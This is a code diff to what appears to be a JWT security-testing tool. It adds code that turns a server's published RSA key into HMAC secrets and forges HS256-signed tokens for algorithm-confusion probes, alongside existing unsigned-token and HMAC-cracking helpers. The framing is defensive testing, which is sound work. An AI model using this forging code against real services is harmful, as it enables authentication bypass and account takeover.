@@ -101,17 +101,112 @@ def crack_hmac(token: str, extra: tuple = ()) -> str | None:
     return None
 
 
+# ── public key encoding ─────────────────────────────────────────────────────
+# DER tags, from X.690.
+_SEQUENCE, _INTEGER, _BIT_STRING = 0x30, 0x02, 0x03
+# AlgorithmIdentifier for rsaEncryption: SEQUENCE { OID 1.2.840.113549.1.1.1, NULL }
+_RSA_ALGORITHM = bytes.fromhex("300d06092a864886f70d0101010500")
+
+
+def _der_length(length: int) -> bytes:
+    if length < 0x80:
+        return bytes([length])
+    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
+    return bytes([0x80 | len(raw)]) + raw
+
+
+def _der(tag: int, payload: bytes) -> bytes:
+    return bytes([tag]) + _der_length(len(payload)) + payload
+
+
+def _der_integer(raw: bytes) -> bytes:
+    """A DER INTEGER: minimal, and never read as negative."""
+    value = raw.lstrip(b"\x00") or b"\x00"
+    if value[0] & 0x80:
+        value = b"\x00" + value
+    return _der(_INTEGER, value)
+
+
+def rsa_pkcs1_der(modulus: bytes, exponent: bytes) -> bytes:
+    """RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }"""
+    return _der(_SEQUENCE, _der_integer(modulus) + _der_integer(exponent))
+
+
+def rsa_spki_der(modulus: bytes, exponent: bytes) -> bytes:
+    """SubjectPublicKeyInfo: the form every library writes by default."""
+    # The BIT STRING's leading zero byte is its count of unused trailing bits.
+    inner = _der(_BIT_STRING, b"\x00" + rsa_pkcs1_der(modulus, exponent))
+    return _der(_SEQUENCE, _RSA_ALGORITHM + inner)
+
+
+def pem(der: bytes, label: str) -> str:
+    body = base64.b64encode(der).decode("ascii")
+    wrapped = "\n".join(body[index:index + 64] for index in range(0, len(body), 64))
+    return f"-----BEGIN {label}-----\n{wrapped}\n-----END {label}-----\n"
+
+
+def jwks_signing_keys(document, *, key_id: str | None = None, limit: int = 2) -> list[dict]:
+    """RSA verification keys from a JWKS, the token's own kid first.
+
+    Keys marked for encryption are skipped: they are not what a signature was
+    checked against, so a probe built from one proves nothing.
+    """
+    keys = document.get("keys") if isinstance(document, dict) else None
+    if not isinstance(keys, list):
+        return []
+    usable = [key for key in keys
+              if isinstance(key, dict) and key.get("kty") == "RSA"
+              and isinstance(key.get("n"), str) and isinstance(key.get("e"), str)
+              and key.get("use") in (None, "sig")
+              and str(key.get("alg") or "RS256").upper().startswith(("RS", "PS"))]
+    if key_id:
+        usable.sort(key=lambda key: key.get("kid") != key_id)
+    return usable[:limit]
+
+
+def confusion_keys(jwk: dict) -> list[tuple[str, bytes]]:
+    """The HMAC secrets a confused RS256 verifier would be holding.
+
+    Each is a labelled byte string, most likely first. The label goes in the
+    finding, because "which encoding" is the first thing the person fixing it
+    needs in order to find the call that loaded it.
+    """
+    try:
+        modulus = _b64url_decode(jwk["n"])
+        exponent = _b64url_decode(jwk["e"])
+    except (KeyError, TypeError, ValueError, binascii.Error):
+        return []
+    if not modulus or not exponent:
+        return []
+    spki = pem(rsa_spki_der(modulus, exponent), "PUBLIC KEY")
+    pkcs1 = pem(rsa_pkcs1_der(modulus, exponent), "RSA PUBLIC KEY")
+    return [
+        ("SubjectPublicKeyInfo PEM", spki.encode("ascii")),
+        # A configuration value read with .strip() loses the final newline.
+        ("SubjectPublicKeyInfo PEM without its trailing newline",
+         spki.rstrip("\n").encode("ascii")),
+        ("PKCS#1 PEM", pkcs1.encode("ascii")),
+    ]
+
+
 def forge_unsigned(payload: dict, *, alg: str = "none", header_extra: dict | None = None) -> str:
     """A token with an empty signature, for testing signature enforcement."""
     header = {"alg": alg, "typ": "JWT", **(header_extra or {})}
     return f"{_encode_part(header)}.{_encode_part(payload)}."
 
 
-def forge_hmac(payload: dict, secret: str, *, alg: str = "HS256") -> str:
-    header = {"alg": alg, "typ": "JWT"}
+def forge_hmac(payload: dict, secret: str | bytes, *, alg: str = "HS256",
+               header_extra: dict | None = None) -> str:
+    """Sign claims with an HMAC key.
+
+    ``secret`` may be bytes: in an algorithm confusion probe the key is a PEM
+    document, and what matters is the exact byte sequence the server holds.
+    """
+    header = {"alg": alg, "typ": "JWT", **(header_extra or {})}
     digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg.upper()]
     signing_input = f"{_encode_part(header)}.{_encode_part(payload)}"
-    signature = hmac.new(secret.encode("utf-8"), signing_input.encode("ascii"), digest).digest()
+    key = secret.encode("utf-8") if isinstance(secret, str) else secret
+    signature = hmac.new(key, signing_input.encode("ascii"), digest).digest()
     return f"{signing_input}.{_b64url_encode(signature)}"
 
 
